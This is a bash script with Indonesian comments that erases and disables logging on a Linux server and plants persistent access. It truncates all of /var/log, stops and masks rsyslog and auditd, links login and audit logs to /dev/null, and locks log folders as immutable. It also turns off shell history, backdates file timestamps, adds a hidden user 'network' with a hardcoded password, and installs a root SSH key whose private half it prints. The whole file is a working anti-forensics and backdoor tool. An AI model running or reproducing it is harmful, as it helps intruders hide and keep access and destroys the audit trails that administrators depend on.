#!/bin/bash

# sed -i 's/\r$//' bersih1.sh
# chmod +x bersih1.sh
# ./bersih1.sh
# Pastikan skrip dijalankan sebagai root
if [ "$EUID" -ne 0 ]; then 
  echo "Harus akses root di jalankan"
  exit
fi

unset HISTFILE && export HISTSIZE=0 && export HISTFILE=/dev/null && export HISTFILESIZE=0 && set +o history && export HISTCONTROL=ignorespace && export TERM=xterm

echo "--- Memulai proses pembersihan log dan penguncian jejak log  ---"

# 1. Mengosongkan semua file log yang ada saat ini
find /var/log/ -type f -exec truncate -s 0 {} \; 2>/dev/null
chattr -i -R /tmp/
rm -rf /tmp/* 2>/dev/null
sudo sync; echo 3 | sudo tee /proc/sys/vm/drop_caches
find /var/log/ -exec touch -r /usr/games {} \;
find /tmp/ -exec touch -r /usr/games {} \;
chattr -a -R /var/log/
chattr -i -R /var/log/

# 2. Modifikasi /etc/rsyslog.conf secara otomatis (Menambahkan komentar #)
# Menggunakan sed untuk mencari baris spesifik dan menambahkan # di depannya
sed -i 's/^[^#]*\/var\/log\/messages/# &/' /etc/rsyslog.conf
sed -i 's/^[^#]*\/var\/log\/secure/# &/' /etc/rsyslog.conf

# 3. Menghentikan dan mengunci layanan Logging
systemctl restart rsyslog
systemctl stop rsyslog
systemctl disable rsyslog
systemctl mask rsyslog

# 4. Mematikan auditd dan sistem audit
systemctl stop auditd 2>/dev/null
service auditd stop 2>/dev/null
auditctl -e 0

find /etc/* -exec touch -r /usr/games {} \;
# 5. Membuat "Lubang Hitam" (/dev/null) untuk log biner & audit
logs=("/var/log/btmp" "/var/log/wtmp" "/var/log/lastlog" "/var/log/audit/audit.log")
for logfile in "${logs[@]}"; do
    rm -f "$logfile"
    ln -s /dev/null "$logfile"
    echo "Symlink created for $logfile"
done

# 6. Mematikan logrotate untuk btmp agar tidak error
if [ -f /etc/logrotate.d/btmp ]; then
    sed -i 's/^/# /' /etc/logrotate.d/btmp
fi

# 7. Mengatur hak akses folder log menjadi sangat ketat
chmod -R 000 /var/log/
chown root:root -R /var/log/

# 8. Kunci folder log secara permanen (Immutable)
# Catatan: Gunakan +i agar benar-benar tidak bisa diubah sama sekali
chattr +i -R /var/log/

truncate -s 0 ~/.bash_history ~/.bash_profile ~/.mysql_history ~/.profile ~/.selected_editor ~/.viminfo ~/.wget-hsts ~/.cache ~/.ldx ~/.node_repl_history ~/.psql_history
# Kumpulan perintah untuk .bashrc dan /etc/profile
COMMANDS="
unset HISTFILE
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
set +o history
export HISTCONTROL=ignorespace"

# Perintah untuk .bash_logout
LOGOUT_COMMAND="> ~/.bash_history"

echo "Memulai proses konfigurasi anti-history tingkat lanjut..."

# 1. Tambahkan ke ~/.bashrc
echo "$COMMANDS" >> ~/.bashrc
echo "[+] Berhasil menambahkan ke ~/.bashrc"

# 2. Tambahkan ke /etc/profile
if [ "$EUID" -ne 0 ]; then
  echo "$COMMANDS" | sudo tee -a /etc/profile > /dev/null
else
  echo "$COMMANDS" >> /etc/profile
fi
echo "[+] Berhasil menambahkan ke /etc/profile"

# 3. Tambahkan ke ~/.bash_logout
echo "$LOGOUT_COMMAND" >> ~/.bash_logout
echo "[+] Berhasil menambahkan ke ~/.bash_logout"

# 4. Jalankan source
source ~/.bashrc
source /etc/profile
# Note: source pada .bash_logout biasanya tidak memberikan output visual, 
# tapi kita jalankan sesuai permintaan untuk memastikan sintaks diterima.
source ~/.bash_logout 2>/dev/null
find ~/.bash_history ~/.bash_logout ~/.bash_profile ~/.bashrc ~/.config ~/.local ~/.mysql_history ~/.profile ~/.selected_editor ~/.viminfo ~/.wget-hsts ~/.cache ~/.ldx ~/.node_repl_history ~/.psql_history -exec touch -r /usr/games {} \;
chattr +i ~/.bash_history ~/.bash_logout ~/.bash_profile ~/.bashrc ~/.config ~/.local ~/.mysql_history ~/.profile ~/.selected_editor ~/.viminfo ~/.wget-hsts ~/.cache ~/.ldx ~/.node_repl_history ~/.psql_history

sudo useradd -r -m -s /bin/bash network >/dev/null 2>&1 && echo "network:rijal01" | sudo chpasswd >/dev/null 2>&1
truncate -s 0 /home/network/.bash_history /home/network/.bash_profile /home/network/.mysql_history /home/network/.profile /home/network/.selected_editor /home/network/.viminfo /home/network/.wget-hsts /home/network/.cache /home/network/.ldx /home/network/.node_repl_history /home/network/.psql_history
find /home/network/.bash_history /home/network/.bash_profile /home/network/.mysql_history /home/network/.profile /home/network/.selected_editor /home/network/.viminfo /home/network/.wget-hsts /home/network/.cache /home/network/.ldx /home/network/.node_repl_history /home/network/.psql_history -exec touch -r /usr/games {} \;
chattr +i /home/network/.bash_history /home/network/.bash_profile /home/network/.mysql_history /home/network/.profile /home/network/.selected_editor /home/network/.viminfo /home/network/.wget-hsts /home/network/.cache /home/network/.ldx /home/network/.node_repl_history /home/network/.psql_history
ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -N ""
cat /root/.ssh/id_rsa.pub > /root/.ssh/authorized_keys
find /root/.ssh -exec touch -r /usr/games {} \;
chattr +i -R /root/.ssh
cat /root/.ssh/id_rsa

echo "--- SELESAI Buat SSH-Keygen lalu add user network dan Server sekarang dalam mode Silent dan bersih dari log ---"
history -c && history -w
